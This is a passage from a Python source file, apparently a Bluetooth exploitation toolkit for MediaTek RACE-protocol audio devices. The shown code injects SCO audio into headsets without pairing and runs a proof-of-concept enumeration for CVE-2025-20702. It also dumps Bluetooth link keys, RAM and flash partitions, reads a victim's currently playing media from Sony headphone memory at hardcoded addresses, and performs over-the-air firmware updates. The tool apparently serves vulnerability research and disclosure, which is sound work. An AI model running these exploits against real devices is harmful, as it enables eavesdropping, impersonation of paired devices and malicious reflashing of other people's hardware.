                                        sco_packet = HCI_SynchronousDataPacket(
                                            connection_handle=sco_handle[0],
                                            packet_status=0,
                                            data_total_length=len(audio_data),
                                            data=audio_data)

                                        # Send via HCI
                                        # Note: Bumble's USB transport doesn't support
                                        # isochronous endpoints for SCO, so audio may not
                                        # actually be transmitted. The SCO connection itself
                                        # proves the vulnerability.
                                        try:
                                            host.send_hci_packet(sco_packet)
                                        except Exception:
                                            pass  # USB transport doesn't support SCO
                                        total_packets += 1
                                        samples_sent += len(samples)

                                        # Pace the audio (60 bytes at 8kHz = 3.75ms)
                                        await asyncio.sleep(0.00375)

                                    logging.info(
                                        "  Ring cycle %d: ON", cycle // 2 + 1)
                                else:
                                    # Silence phase (500ms)
                                    logging.info(
                                        "  Ring cycle %d: pause", cycle // 2 + 1)
                                    await asyncio.sleep(0.5)

                            logging.info("")
                            logging.info(
                                "Sent %d SCO audio packets!", total_packets)
                            logging.info("")
                            logging.info("=" * 60)
                            logging.info("VULNERABILITY CONFIRMED!")
                            logging.info("=" * 60)
                            logging.info("")
                            logging.info(
                                "SCO audio channel established WITHOUT pairing!")
                            logging.info("")
                            logging.info(
                                "NOTE: Audio may not play due to USB transport")
                            logging.info(
                                "limitations (Bumble doesn't support isochronous")
                            logging.info(
                                "USB endpoints for SCO audio transmission).")
                            logging.info("")
                            logging.info(
                                "HOWEVER: The SCO connection itself proves the")
                            logging.info(
                                "vulnerability - an attacker with proper hardware")
                            logging.info(
                                "(phone, dedicated BT chip) could inject audio!")

                    except asyncio.TimeoutError:
                        logging.info("")
                        logging.info("-" * 60)
                        logging.info(
                            "SCO connection was rejected or timed out.")
                        logging.info(
                            "This could mean:")
                        logging.info(
                            "  1. Headset requires pairing for SCO (partial fix)")
                        logging.info(
                            "  2. Another device has the audio channel")
                        logging.info(
                            "  3. Headset doesn't support this SCO configuration")
                        logging.info("-" * 60)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("SCO audio setup failed: %s", e)
                        import traceback as tb
                        tb.print_exc()
                else:
                    logging.error(
                        "sco-ring is only available in AG role with headsets.")

        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.error("Action failed: %s", e)
    else:
        # SLC failed or no protocol - show what we achieved
        logging.info("-" * 60)
        logging.info("RESULT")
        logging.info("-" * 60)
        logging.info("")
        logging.info("RFCOMM connection succeeded WITHOUT pairing.")
        logging.info("")
        if use_ag_role:
            logging.info("Connected to HEADSET as Audio Gateway.")
            logging.info("SLC handshake did not complete - possible causes:")
            logging.info("  - Device may be PATCHED (fixed)")
            logging.info("  - Device already connected to a phone")
            logging.info("  - Device requires different HFP configuration")
        else:
            logging.info("Connected to device as Hands-Free Unit.")
            logging.info("SLC handshake did not complete.")
        logging.info("")
        logging.info("RFCOMM access without pairing = vulnerability exists.")
        logging.info("SLC failure may indicate partial mitigation.")

    logging.info("")
    logging.info("-" * 60)
    logging.info("SUMMARY")
    logging.info("-" * 60)
    logging.info("")
    if slc_established:
        logging.info("VULNERABLE: Full HFP access achieved without pairing!")
        if use_ag_role:
            logging.info("  - Sent real HFP commands to headset")
            logging.info("  - Headset accepted us as Audio Gateway")
        else:
            logging.info("  - Full control over phone's HFP interface")
    else:
        logging.info("PARTIAL: RFCOMM connected but SLC did not complete.")
        logging.info("  - This may indicate the device is PATCHED")
        logging.info("  - Or requires additional protocol handling")
    logging.info("")
    logging.info("Connection was made WITHOUT pairing/authentication.")
    logging.info("")

    # Cleanup
    try:
        if rfcomm_mux:
            await rfcomm_mux.disconnect()
    except Exception:  # pylint: disable=broad-exception-caught
        pass
    await checker.close()


async def command_enumerate_race(r: RACE):
    """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).

    This command demonstrates the impact of CVE-2025-20702 by connecting to
    the RACE protocol and enumerating what sensitive data can be accessed.
    """
    logging.info("=" * 60)
    logging.info("CVE-2025-20702: RACE Protocol Exposure - PoC")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "RACE (Relay And Command Engine) is MediaTek's debug/control protocol."
    )
    logging.info(
        "It provides privileged access to device internals including:"
    )
    logging.info("  - Reading/writing RAM and Flash memory")
    logging.info("  - Dumping Bluetooth link keys (device pairing secrets)")
    logging.info("  - Firmware updates (FOTA)")
    logging.info("  - Device configuration and diagnostics")
    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RACE protocol...")
    logging.info("-" * 60)

    try:
        await r.setup()
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Failed to connect to RACE protocol: %s", e)
        return

    logging.info("RACE protocol connection established!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("ENUMERATING ACCESSIBLE DATA:")
    logging.info("-" * 60)
    logging.info("")

    # Try to get SDK info
    logging.info("[1] SDK Information:")
    try:
        p = GetSDKInfo()
        res = await r.send_sync(p)
        sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", sdk_info)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get build version
    logging.info("")
    logging.info("[2] Build Version:")
    try:
        p = BuildVersion()
        res = await r.send_sync(p)
        build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
        logging.info("    %s", build_ver)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to get Bluetooth address
    logging.info("")
    logging.info("[3] Bluetooth Address:")
    try:
        p = GetEDRAddress()
        res = await r.send_sync(p)
        addr_pkt = GetEDRAddressResponse.unpack(res)
        formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
        logging.info("    %s", formatted_addr)
        logging.info("    -> ACCESSIBLE")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to dump link keys (most sensitive!)
    logging.info("")
    logging.info("[4] Bluetooth Link Keys (CRITICAL):")
    try:
        p = GetLinkKey()
        res = await r.send_sync(p)
        if len(res) > 7:
            link_key_data = res[7:]
            # Check if there are any link keys
            if link_key_data and any(b != 0 for b in link_key_data):
                logging.info("    Found %d bytes of link key data",
                             len(link_key_data))
                logging.info("    -> ACCESSIBLE - CRITICAL SECURITY BREACH!")
                logging.info(
                    "    -> Attacker can impersonate paired devices!")
            else:
                logging.info("    No link keys stored (device not paired)")
                logging.info("    -> Command accessible, no data present")
        else:
            logging.info("    -> Command accessible")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read RAM (sample - first few bytes)
    logging.info("")
    logging.info("[5] RAM Access:")
    try:
        # Try to read a small chunk from a typical RAM address
        dumper = RACERAMDumper(r, 0x04200000, 16, progress=False)
        sample_data = await dumper.dump()
        if sample_data:
            logging.info("    Successfully read 16 bytes from RAM")
            logging.info("    -> ACCESSIBLE - Full memory read possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Try to read Flash (partition table area)
    logging.info("")
    logging.info("[6] Flash Memory Access:")
    try:
        flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
        sample_flash = await flash_dumper.dump()
        if sample_flash:
            logging.info("    Successfully read 256 bytes from Flash")
            logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
        else:
            logging.info("    -> Read returned empty data")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("    -> Not accessible: %s", e)

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
    logging.info("=" * 60)
    logging.info("")
    logging.info("The RACE protocol is exposed without authentication.")
    logging.info("An attacker can:")
    logging.info("  1. Read device firmware and extract secrets")
    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
    logging.info("  3. Read/write device memory for code execution")
    logging.info("  4. Flash malicious firmware updates")
    logging.info("")
    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
    logging.info("can fully compromise this device from up to 10 meters away.")
    logging.info("")


async def command_raw(r: RACE, cmd_id: int, outfile: str):
    """Send a raw RACE command with the specified ID."""
    race_header = RaceHeader(
        head=0x5, type_=RaceType.CMD_EXPECTS_RESPONSE, id_=cmd_id)

    await _send_race_command(
        r, RacePacket(race_header), outfile,
        log_request="Sending raw RACE command",
        log_response="Got response"
    )


async def command_sdkinfo(r: RACE, outfile: str):
    """Retrieve SDK information from the target device."""
    def display_info(data: bytes):
        logging.info(data[7:].decode("utf8"))

    await _send_race_command(
        r, GetSDKInfo(), outfile,
        log_request="Sending get SDK info request",
        log_response="Got SDK info response",
        display_func=display_info
    )


async def command_buildversion(r: RACE, outfile: str):
    """Retrieve and display build version from the target device."""
    def display_version(data: bytes):
        logging.info(data[7:].decode("utf8"))

    await _send_race_command(
        r, BuildVersion(), outfile,
        log_request="Sending get build version request",
        log_response="Got build version response",
        display_func=display_version
    )


async def _read_media_attr(d: RACEDumper, addr: int) -> str:
    """Read a media attribute from RAM at the given address."""
    ptr_bytes = await d.dump(addr, 0x4)
    ptr = struct.unpack("<I", ptr_bytes)[0]
    data = await d.dump(ptr, 0x40)
    return data.decode("utf8")


async def command_mediainfo(r: RACE):
    """Dump current playing media info from the target device."""
    logging.info(
        "Trying to dump current playing media info. Identifying model and firmware version first..."
    )
    try:
        bv = await _get_buildversion(r)
    except asyncio.TimeoutError as e:
        logging.error("Failed to get build version: %s", e)
        return
    bv = bv[7:].replace(b"\x00", b"").decode("ascii")
    logging.info("Got buildversion `%s`.", bv)

    dumper = RACERAMDumper(r, 0, 0, progress=False)
    # We only do this for device that we know and where can get the buildversion.
    # Currently this is Sony CH-WH720n in version 1.0.8, 1.0.9, and 1.1.0
    if (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12023/01/12 19:15:56 GMT +08:00"
    ):  # v1.0.8
        t = await _read_media_attr(dumper, 0x14238C9C)
        al = await _read_media_attr(dumper, 0x14238CA4)
        ar = await _read_media_attr(dumper, 0x14238C8C)
        gen = await _read_media_attr(dumper, 0x14238CA8)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/09/18 18:58:55 GMT +08:00"
    ):  # v1.1.0
        t = await _read_media_attr(dumper, 0x14238C98)
        al = await _read_media_attr(dumper, 0x14238CA0)
        ar = await _read_media_attr(dumper, 0x14238C88)
        gen = await _read_media_attr(dumper, 0x14238CA4)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/06/28 13:44:31 GMT +08:00"
    ):  # v1.0.9
        # each field is prepended with 0x02 0xLL where LL is the length of the string
        # but to be faster we just dump 0x100 bytes and do the parsing afterwards, hoping we
        # dumped enough
        data = await dumper.dump(0x14238DB0, 0x100)
        parts = data.split(b"\x02")[1:5]
        m = ["Track", "Album", "Artist", "Genre"]
        logging.info("Your target is currently listening to:")
        for i, part in enumerate(parts):
            plen = part[0]
            logging.info("\t%s: %s", m[i], part[1: plen + 1].decode('utf8'))
            if len(part) > plen + 1 and part[plen + 1] == 0x01:
                break
    else:
        logging.error(
            "Sorry, we don't know this buildversion. We don't support unknown versions."
        )


async def command_dump_partition(r: RACE, outfile: str):
    """Interactively choose and dump a partition from the target device."""
    # dumping a whole partion to stdout is kinda stupid, so lets not do it
    if not outfile:
        logging.error(
            "Please specify an outfile to dump the NVDM partition to.")
        sys.exit(1)

    logging.info("Reading partition table:")
    pt_dumper = RACEFlashDumper(r, 0x0, 0x1000)
    pt = await pt_dumper.dump()

    partitions = parse_partition_table(pt)
    logging.info("\nPartition Table")
    logging.info("===================")
    for idx, (addr, size, ptype) in enumerate(partitions):
        logging.info(
            "Partition %2d: Address = 0x%08X, Length = 0x%08X, Type = %s",
            idx, addr, size, ptype
        )
    logging.info(
        "\n\x1b[3mHint: The NVDM partition is usually in partition 6\x1b[0m\n")

    chosen = -1
    while chosen >= len(partitions) or chosen < 0:
        chosen = int(input("Which partition would you like to dump?\n"))

    ptaddr, ptsize, _ = partitions[chosen]
    logging.info("Dumping partition %d at 0x%08X", chosen, ptaddr)

    # Use helper for consistent output handling
    dumper = RACEFlashDumper(r, ptaddr, ptsize)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
        logging.info("Partition dump saved to %s", outfile)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_fota(
    r: RACE, fota_file: str, dont_reflash: bool, chunks_per_write: int
):
    """Perform FOTA (Firmware Over The Air) update on the target device."""
    f = FOTAUpdater(r, chunks_per_write)
    if fota_file is None and dont_reflash is False:
        logging.error(
            "FOTA File is required when --dont-reflash is not set!"
        )
        return
    # Invert the dont_reflash flag so that it's clearer in the FOTA updater class
    await f.update(fota_file, not dont_reflash)


async def main():
    """Main entry point for the RACE toolkit."""
    # Parse arguments and commands
    args = parse_args()

    setup_logging(args.debug)

    # Commands that don't need RACE transport
    if args.command == "check":
        await command_check(args)
        return
    if args.command == "enumerate-classic":
        await command_enumerate_classic(args)
        return
    if args.command == "hfp-demo":
        await command_hfp_demo(args)
        return
    if args.command == "scan":
        await command_scan(args)
        return
    if args.command == "ble-scan":
        await command_ble_scan(args)
        return
    if args.command == "ble-info":
        await command_ble_info(args)
        return
    if args.command == "ble-speaker":
        await command_ble_speaker(args)
        return
    if args.command == "avrcp":
        await command_avrcp(args)
        return

    # Initialize the transport class based on the given technology and target UUIDs
    transport = None
    try:
        transport = init_transport(args)
    except ValueError as e:
        logging.error("Transport could not be initialized: %s", e)
        return

    r = None
    try:
        r = RACE(transport, args.send_delay)
        if args.command == "ram":
            await command_ram(r, args.address, args.size, args.outfile, args.debug)
        elif args.command == "raw":
            # args.id is fine, it's not a builtin shadow
            await command_raw(r, args.id, args.outfile)
        elif args.command == "flash":
            await command_flash(
                r, args.address, args.size, args.outfile, args.debug
            )
        elif args.command == "link-keys":
            await command_link_keys(r, args.outfile)
        elif args.command == "bdaddr":
            await command_bdaddr(r, args.outfile)
        elif args.command == "sdkinfo":
            await command_sdkinfo(r, args.outfile)
        elif args.command == "buildversion":
            await command_buildversion(r, args.outfile)
        elif args.command == "mediainfo":
            await command_mediainfo(r)
        elif args.command == "enumerate-race":
            await command_enumerate_race(r)
        elif args.command == "dump-partition":
            await command_dump_partition(r, args.outfile)
        elif args.command == "fota":
            await command_fota(
                r, args.fota_file, args.dont_reflash, args.chunks_per_write
            )
    except ConnectionError as e:
        logging.error("Connection failed: %s", e)
        # Offer to try alternative transport if using GATT
        if args.transport.lower() == "gatt" and args.target_address:
            logging.info(
                "Tip: Your device may use Bluetooth Classic. "
                "Try: --transport rfcomm --target-address %s",
                args.target_address
            )
        elif args.transport.lower() == "gatt" and not args.target_address:
            await _offer_transport_fallback(args, r)
    finally:
        if r is not None:
            await r.close()


async def _offer_transport_fallback(
    args: argparse.Namespace, current_race: RACE | None
):
    """Offer to try RFCOMM transport when GATT fails."""
    logging.info(
        "\nWould you like to try Bluetooth Classic (RFCOMM) instead? [y/N]: "
    )
    response = input().strip().lower()
    if response in ("y", "yes"):
        logging.info(
            "Please enter the Bluetooth Classic address (e.g., AA:BB:CC:DD:EE:FF):")
        bt_addr = input().strip()
        if bt_addr:
            # Close the current connection if any
            if current_race is not None:
                await current_race.close()

            # Try RFCOMM
            logging.info("Attempting RFCOMM connection to %s...", bt_addr)
            release_bluetooth_controller(args.controller)
            rfcomm_transport = RFCOMMTransport(
                args.controller, bt_addr, args.authenticate
            )
            r = RACE(rfcomm_transport, args.send_delay)
            try:
                # Re-run the command with new transport
                if args.command == "mediainfo":
                    await command_mediainfo(r)
                elif args.command == "buildversion":
                    await command_buildversion(r, args.outfile)
                elif args.command == "sdkinfo":
                    await command_sdkinfo(r, args.outfile)
                elif args.command == "bdaddr":
                    await command_bdaddr(r, args.outfile)
                else:
                    logging.info(
                        "Please re-run the command with --transport rfcomm --target-address %s",
                        bt_addr
                    )
            finally:
                await r.close()


def run_main():
    """Run main with proper exception handling."""
    import signal

    # Check debug flag early for exception handling display
    debug_mode = "--debug" in sys.argv

    # Set up a flag to track if we're shutting down
    shutdown_requested = False

    def force_exit(signum, frame):
        """Force exit on second Ctrl+C."""
        print("\n\033[1;31mForce exit.\033[0m")
        sys.exit(130)

    try:
        asyncio.run(main())
    except asyncio.CancelledError:
        # Task was cancelled, usually due to connection issues or Ctrl+C
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        # Don't print error if it was user-initiated
        if not shutdown_requested:
            logging.error(
                "Operation was cancelled. The connection may have been lost."
            )
        sys.exit(1)
    except asyncio.TimeoutError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        msg = str(e) if str(e) else "Operation timed out."
        logging.error("%s", msg)
        sys.exit(1)
    except ConnectionError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Connection error: %s", e)
        sys.exit(1)
    except USBErrorBusy:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "USB device is busy. The Bluetooth controller may still be in use. "
            "Try unplugging and replugging the adapter, or run: "
            "sudo systemctl stop bluetooth"
        )
        sys.exit(1)
    except KeyboardInterrupt:
        # User pressed Ctrl+C - this is expected, not an error
        shutdown_requested = True
        # Install handler for second Ctrl+C to force exit
        signal.signal(signal.SIGINT, force_exit)
        print(
            "\n\033[1;33mInterrupted. Press Ctrl+C again to force exit.\033[0m")
        sys.exit(130)
    except Exception as e:  # pylint: disable=broad-exception-caught
        # Catch-all for any other exceptions (including bumble exceptions)
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Error: %s", e)
        if not debug_mode:
            logging.info("Run with --debug for full traceback.")
        sys.exit(1)


if __name__ == "__main__":
    run_main()
